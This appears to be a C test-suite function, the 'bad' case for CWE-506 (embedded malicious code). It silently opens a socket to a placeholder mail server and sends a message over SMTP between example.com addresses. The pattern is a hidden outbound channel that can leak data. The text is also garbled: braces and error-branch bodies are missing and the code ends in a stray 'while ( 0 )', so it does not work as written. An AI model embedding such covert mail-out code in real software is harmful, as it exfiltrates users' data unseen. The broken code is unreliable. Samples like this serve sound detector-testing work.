void CWE506_Embedded_Malicious_Code__w32_email_06_bad() if ( STATIC_CONST_FIVE == 5 )  WSADATA wsaData ; struct sockaddr_in service ; struct hostent * hostIP ; char recBuffer [ 4096 ] = "" ; char msgBuffer [ 255 ] = "" ; if ( WSAStartup ( MAKEWORD ( 2 , 2 ) , & wsaData ) != NO_ERROR )  connectSocket = socket ( AF_INET , SOCK_STREAM , IPPROTO_TCP ); if ( connectSocket == INVALID_SOCKET )  hostIP = gethostbyname ( MAIL_SERVER ); memset ( & service , 0 , sizeof ( service ) ); service . sin_family = AF_INET; service . sin_addr = * ( ( struct in_addr * ) * hostIP -> h_addr_list ); service . sin_port = htons ( 25 ); if ( connect ( connectSocket , ( struct sockaddr * ) & service , sizeof ( service ) ) == SOCKET_ERROR )  if ( recv ( connectSocket , recBuffer , sizeof ( recBuffer ) , 0 ) <= 0 )  sprintf ( msgBuffer , "HELO %s%s" , MAIL_SERVER , CRLF ); if ( send ( connectSocket , msgBuffer , strlen ( msgBuffer ) , 0 ) <= 0 )  if ( recv ( connectSocket , recBuffer , sizeof ( recBuffer ) , 0 ) <= 0 )  sprintf ( msgBuffer , "MAIL FROM:<%s>%s" , "sender@example.com" , CRLF ); if ( send ( connectSocket , msgBuffer , strlen ( msgBuffer ) , 0 ) <= 0 )  if ( recv ( connectSocket , recBuffer , sizeof ( recBuffer ) , 0 ) <= 0 )  sprintf ( msgBuffer , "RCPT TO:<%s>%s" , "receiver@example.com" , CRLF ); if ( send ( connectSocket , msgBuffer , strlen ( msgBuffer ) , 0 ) <= 0 )  if ( recv ( connectSocket , recBuffer , sizeof ( recBuffer ) , 0 ) <= 0 )  sprintf ( msgBuffer , "DATA%s" , CRLF ); if ( send ( connectSocket , msgBuffer , strlen ( msgBuffer ) , 0 ) <= 0 )  if ( recv ( connectSocket , recBuffer , sizeof ( recBuffer ) , 0 ) <= 0 )  sprintf ( msgBuffer , "%s%s" , "Shhh, I'm sending some bad stuff!" , CRLF ); if ( send ( connectSocket , msgBuffer , strlen ( msgBuffer ) , 0 ) <= 0 )  sprintf ( msgBuffer , "%s.%s" , CRLF , CRLF ); if ( send ( connectSocket , msgBuffer , strlen ( msgBuffer ) , 0 ) <= 0 )  if ( recv ( connectSocket , recBuffer , sizeof ( recBuffer ) , 0 ) <= 0 )  sprintf ( msgBuffer , "QUIT%s" , CRLF ); if ( send ( connectSocket , msgBuffer , strlen ( msgBuffer ) , 0 ) <= 0 )  if ( recv ( connectSocket , recBuffer , sizeof ( recBuffer ) , 0 ) <= 0 )  while ( 0 )  